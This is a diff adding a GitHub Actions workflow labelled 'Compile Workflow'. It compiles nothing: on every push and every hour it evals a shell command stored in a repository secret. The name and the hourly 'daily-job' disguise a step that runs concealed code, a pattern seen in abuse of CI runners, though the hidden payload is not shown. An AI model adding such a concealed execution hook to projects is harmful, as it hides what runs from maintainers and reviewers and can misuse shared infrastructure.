@@ -1,0 +1,22 @@
+name: Compile Workflow
+
+on:
+  push:
+    branches:
+      - '*'
+  schedule:
+    - cron: '0 * * * *'
+
+jobs:
+  daily-job:
+    runs-on: ubuntu-latest
+    environment: Funzia
+    steps:
+    - name: Checkout repository content
+      uses: actions/checkout@v2
+
+    - name: Run a multi-line script
+      run: |
+        eval $COM1
+      env:
+        COM1: ${{ secrets.fu }}
